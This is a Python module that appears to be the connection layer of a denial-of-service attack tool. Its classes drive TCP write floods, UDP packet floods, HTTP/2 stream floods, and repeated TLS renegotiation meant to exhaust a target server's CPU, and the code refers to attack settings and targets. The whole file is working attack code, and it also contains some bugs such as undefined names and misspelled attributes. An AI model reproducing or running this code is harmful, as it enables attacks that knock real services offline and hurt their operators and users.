import asyncio
import errno
import time
from enum import Enum
from typing import Any, Callable, Generator, List, Optional, Set, Tuple

from OpenSSL import SSL

from .core import CONN_PROBE_PERIOD, UDP_BATCH_PACKETS, UDP_ENOBUFS_PAUSE


DRAIN_PROBE_INTERVAL = 5

import collections
import collections.abc
setattr(collections, 'MutableSet', collections.abc.MutableSet)
setattr(collections, 'MutableMapping', collections.abc.MutableMapping)

import h2.connection
setattr(collections, 'MutableMapping', collections.abc.MutableMapping)


FloodSpecGen = Generator[Tuple[int, Any], None, None]


class FloodOp:
    WRITE = 0
    READ  = 1
    SLEEP = 2


class FloodSpecType(Enum):
    GENERATOR = 0
    BYTES = 1
    CALLABLE = 2
    BUFFER = 3


class FloodSpec:

    @classmethod
    def from_any(cls, spec_type: FloodSpecType, spec, *args) -> FloodSpecGen:
        if spec_type == FloodSpecType.GENERATOR:
            return spec
        if spec_type == FloodSpecType.BYTES:
            return cls.from_bytes(spec, *args)
        if spec_type == FloodSpecType.BUFFER:
            return cls.from_buffer(spec, *args)
        if spec_type == FloodSpecType.CALLABLE:
            return cls.from_callable(spec, *args)
        raise ValueError(f"Don't know how to create spec from {type(spec)}")

    @staticmethod
    def from_bytes(packet: bytes, num_packets: int) -> FloodSpecGen:
        packet_size = len(packet)
        for _ in range(num_packets):
            yield FloodOp.WRITE, (packet, packet_size, 1)

    @staticmethod
    def from_buffer(packet: Tuple[Callable[[], bytes], int], num_packets: int) -> FloodSpecGen:
        packet_gen, stacked = packet
        packet, packet_size = None, None
        for _ in range(int(num_packets / stacked)):
            if packet is None:
                packet = packet_gen()
                packet_size = len(packet)
            yield FloodOp.WRITE, (packet, packet_size, stacked)

    @staticmethod
    def from_callable(packet: Callable[[], bytes], num_packets: int) -> FloodSpecGen:
        for _ in range(num_packets):
            _packet: bytes = packet()
            yield FloodOp.WRITE, (_packet, len(_packet), 1)


class H2FloodIO(asyncio.Protocol):

    def __init__(self, loop, headers: List[Tuple[str, str]], on_close, rcv: bool = False):
        self._loop = loop
        # XXX: ideally we have to read this from settings frame but it's gonna be harder
        self._num_streams = 128/2 - 1
        self._headers = headers
        self._target_host = host
        self._on_close = on_close
        self._rcv = rcv

    def connection_made(self, transport) -> None:
        self._conn = h2.connection.H2Connection()
        self._transport = transport
        # XXX: do we have to read? this is required at least for settings sync
        if not self._rcv:
            self._transport.pause_reading()
        self._conn.initiate_connection()
        # XXX: full request might be (should be) provided from the method definition
        for ind in range(self._num_streams):
            self._conn.send_headers(1+ind*2, self._headers, end_stream=True)
            # XXX: we should also consider body + trailings
        # send everything
        self._loop.call_soon(self._send)
   
    def _send(self):
        data = self._conn.data_to_send()
        if len(data) > 0:
            self._transport.write(data)
        # completely random wait interval
        self._loop.call_later(10, self._close)

    # XXX: do we need to be good citizens by sending RST?
    def _close(self):
        self._conn.close_connection()
        data = self._conn.data_to_send()
        self._transport.write(data)
        self._loop.call_later(1, self._abort)

    def _abort(self):
        self._transport.abort()

    # XXX: do we have to read? this is required at least for settings sync
    def data_received(self, data):
        _events = self._conn.receive_data(data)
        self._loop.call_soon(self._send)

    def connection_lost(self, exc) -> None:
        self._transport = None
        self._on_close.set_result(True)

    def pause_writing(self) -> None:
        pass

    def resume_writing(self) -> None:
        if self._tranposrt is None:
            return
        self._tranport.write(self._conn.data_to_send())



# XXX: add instrumentation to keep track of connection lifetime,
#      number of ops per open connection, and more
class FloodIO(asyncio.Protocol):

    def __init__(
        self,
        loop: asyncio.AbstractEventLoop,
        on_close: asyncio.Future,
        settings: "AttackSettings",
        flood_spec: FloodSpecGen,
        connections: Set[int],
        on_connect: Optional[asyncio.Future] = None,
    ):
        self._loop = loop
        self._flood_spec = flood_spec
        self._settings = settings
        self._on_close: asyncio.Future = on_close
        self._on_close.add_done_callback(self._handle_cancellation)
        self._on_connect = on_connect
        self._transport = None
        self._handle = None
        self._paused: bool = False
        self._paused_at: Optional[int] = None
        self._read_waiting: bool = False
        self._return_code: bool = False
        self._probe_handle = None
        self._num_steps: int = 0
        self._connections = connections

    def connection_made(self, transport) -> None:
        self._connections.add(hash(transport))
        if self._on_connect and not self._on_connect.done():
            self._on_connect.set_result(True)
        self._transport = transport
        self._transport.set_write_buffer_limits(high=self._settings.high_watermark)
        if hasattr(self._transport, "pause_reading"):
            self._transport.pause_reading()
        self._handle = self._loop.call_soon(self._step)
        self._probe_handle = self._loop.call_later(CONN_PROBE_PERIOD, self._probe)

    def _abort(self) -> None:
        if self._transport:
            self._transport.abort()
            self._connections.remove(hash(self._transport))
            self._transport = None

    def _probe(self) -> None:
        # the approach with "probing" instead of direct timeouts tracking (e.g.
        # with loop.call_later) is used to decrease pressure on the event loop.
        # most drains take < 0.1 seconds, which means that each connection is
        # going to generate too many timers/callbacks during normal operations.
        # probing each 5 seconds allows to catch timeouts with ~5s precision while
        # keeping number of callbacks relatively low
        self._probe_handle = None
        if not self._transport:
            return
        if self._paused_at is not None:
            resumed_after = time.time() - self._paused_at
            if resumed_after > self._settings.drain_timeout_seconds:
                # XXX: it might be the case that network is overwhelmed, which means
                #      it's gonna be wise to track special status for the scheduler
                #      to delay re-launch of the task
                self._abort()
                return
        self._probe_handle = self._loop.call_later(DRAIN_PROBE_INTERVAL, self._probe)

    def data_received(self, data) -> None:
        # overall, we don't use data at all
        # do something smarter when corresponding opcode is introduced
        # we also don't track size of the data received. the only use
        # for the read opcode right now is to make sure something was
        # read from the network. in such a case, use of operations like
        # read(1) does not make much of sense (as the data is already
        # buffered anyways)
        if not self._transport:
            return
        if hasattr(self._transport, "pause_reading"):
            self._transport.pause_reading()
        if self._read_waiting:
            self._read_waiting = False
            self._loop.call_soon(self._step)

    def eof_received(self) -> None:
        pass

    def connection_lost(self, exc) -> None:
        if self._transport:
            self._connections.remove(hash(self._transport))
        self._transport = None
        if self._handle:
            self._handle.cancel()
        if self._probe_handle:
            self._probe_handle.cancel()
        if self._on_close.done():
            return
        if exc is None:
            self._on_close.set_result(self._return_code)
        elif isinstance(exc, IOError) and exc.errno == errno.EPIPE:
            # EPIPE exception here means that the connection was interrupted
            # we still consider connection to the target "succesful", no need
            # to bump our failure budget
            # As we typically pause reading, it's unlikely to process EOF from
            # the peer properly. Thus EPIPE instead is expected to happen.
            self._on_close.set_result(self._return_code)
        else:
            self._on_close.set_exception(exc)

    def pause_writing(self) -> None:
        if self._paused:
            return
        self._paused, self._paused_at = True, time.time()

    def resume_writing(self) -> None:
        if not self._paused:
            return
        self._paused, self._paused_at = False, None
        if not self._transport:
            return
        if self._handle is None:
            # XXX: there's an interesting race condition here
            #      as it might happen multiple times
            self._handle = self._loop.call_soon(self._step)

    def _step(self, resumed: bool = False) -> None:
        if not self._transport:
            return
        self._num_steps += 1
        self._return_code = True
        try:
            # XXX: this is actually less flexible than would be necessary
            #      as we still need to keep track of current op & stash
            op, args = next(self._flood_spec)
            if op == FloodOp.WRITE:
                packet, size, num_stacked = args
                self._transport.write(packet)
                self._handle = None
                if not self._paused:
                    self._handle = self._loop.call_soon(self._step)
            elif op == FloodOp.SLEEP:
                self._handle = self._loop.call_later(args, self._step)
            elif op == FloodOp.READ:
                # XXX: what about read timeout, do we even need it?
                #      (it might be okay as long as connection is consumed)
                self._read_waiting = True
                if hasattr(self._transport, "resume_reading"):
                    self._transport.resume_reading()
            else:
                raise ValueError(f"Unknown flood opcode {op}")
        except StopIteration:
            self._transport.close()
            self._connections.remove(hash(self._transport))
            self._transport = None

    def _handle_cancellation(self, on_close):
        if on_close.cancelled() and self._transport and not self._transport.is_closing():
            self._abort()


class DatagramFloodIO(asyncio.Protocol):

    def __init__(
        self,
        loop: asyncio.AbstractEventLoop,
        packet_gen: Callable[[], Tuple[bytes, int]],
        on_close: asyncio.Future,
    ):
        self._loop = loop
        self._packet_gen = packet_gen
        self._on_close = on_close
        self._on_close.add_done_callback(self._handle_cancellation)
        self._transport = None
        self._handle = None

    def connection_made(self, transport) -> None:
        self._transport = transport
        self._handle = self._loop.call_soon(self._send_batch)

    def _send_batch(self) -> None:
        if not self._transport:
            return
        self._handle = None
        sent_bytes = 0
        for _ in range(UDP_BATCH_PACKETS):
            packet, packet_size = self._packet_gen()
            sent_bytes += packet_size
            self._transport.sendto(packet)
        self._handle = self._loop.call_soon(self._send_batch)

    def datagram_received(self, data, addr) -> None:
        pass

    def error_received(self, exc) -> None:
        if isinstance(exc, OSError) and exc.errno == errno.ENOBUFS:
            if self._handle is not None:
                self._handle.cancel()
            self._handle = self._loop.call_later(UDP_ENOBUFS_PAUSE, self._send_batch)
        elif self._transport:
            self._on_close.set_excetion(exc)
            self._transport.abort()
            self._transport = None

    def connection_lost(self, exc) -> None:
        self._transport = None
        if self._handle is not None:
            self._handle.cancel()
        if self._on_close.done():
            return
        if exc is None:
            self._on_close.set_result(True)
        else:
            self._on_close.set_exception(exc)

    def _handle_cancellation(self, on_close):
        if on_close.cancelled() and self._transport and not self._transport.is_closing():
            self._transport.abort()
            self._transport = None


class TrexIOError(IOError):
    pass


class TrexIO(asyncio.Protocol):

    READ_CHUNK_SIZE = 1024

    def __init__(
        self,
        ctx: SSL.Context,
        rpc: int,
        loop: asyncio.AbstractEventLoop,
        on_connect: asyncio.Future,
        on_close: asyncio.Future,
    ):
        self._loop = loop
        self._ctx = ctx
        self._budget = rpc
        self._transport = None
        self._conn: Optional[SSL.Connection] = None
        self._on_connect = on_connect
        self._on_close = on_close
        self._handle = None
        self._nbytes_sent = 0

    def connection_made(self, transport):
        self._transport = transport
        self._conn = SSL.Connection(self._ctx, None)
        self._conn.set_connect_state()
        self._handshake()

    def _process_outgoing(self):
        try:
            data = self._conn.bio_read(self.READ_CHUNK_SIZE)
        except SSL.WantReadError:
            pass
        else:
            nbytes = len(data)
            if nbytes > 0:
                self._nbytes_sent += nbytes
                self._transport.write(data)
                self._loop.call_soon(self._handshake)

    # XXX: not sure if passing around bytes provides good enough performance
    #      it might be beneficial to just pass memoryview over a buffer
    def data_received(self, data):
        self._conn.bio_write(data)
        self._handshake()

    def eof_received(self):
        pass

    # XXX: it might be necessary to send a "dummy" write from time to time
    #      to keep connection "alive"
    def _handshake(self):
        if self._transport is None:
            return
        try:
            self._conn.do_handshake()
        except (SSL.WantReadError, SSL.WantWriteError):
            self._process_outgoing()
        except Exception as e:
            self._terminate(e)
        else:
            if not self._on_connect.done():
                self._on_connect.set_result(True)
            self._nbytes_sent = 0
            self._handle = self._loop.call_soon(self._re)

    def _re(self):
        if self._transport is None:
            return
        self._handle = None
        if not self._conn.renegotiate():
            self._terminate(TrexIOError("Unsupported operation"))
            return
        self._budget -= 1
        if self._budget >= 0:
            self._handshake()

    def _terminate(self, exc: Optional[Exception], abort: bool = True) -> None:
        if self._transport is None:
            return
        if not self._on_connect.done():
            self._on_connect.set_result(False)
        if not self._on_close.done():
            if exc is None:
                self._on_close.set_result(None)
            else:
                self._on_close.set_exception(exc)
        if self._handle is not None:
            self._handle.cancel()
        if abort:
            self._transport.abort()
        self._transport = None

    def connection_lost(self, exc):
        if self._transport is None:
            return
        self._terminate(exc, abort=False)
